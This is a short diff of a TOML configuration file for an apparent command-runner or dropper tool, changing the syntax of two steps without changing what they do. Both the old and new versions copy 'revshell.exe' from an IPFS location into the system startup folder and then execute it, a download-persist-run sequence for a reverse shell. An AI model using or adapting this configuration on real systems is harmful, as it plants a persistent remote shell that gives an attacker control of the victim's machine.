@@ -1,11 +1,9 @@
-order = ["copy_files", "run_shell"]
+# All will be executed, in order
+run_all = ["copy_files", "run_shell"]
 
-[commands.copy_files]
-do = "copy"
-[[commands.copy_files.with]]
+[[commands.copy_files.do.copy]]
 from = "{ipfs}/revshell.exe"
 to = "{startup}/revshell.exe"
 
 [commands.run_shell]
-do = "exec"
-with = ["{startup}/revshell.exe"]
+do = { exec = "{startup}/revshell.exe" }
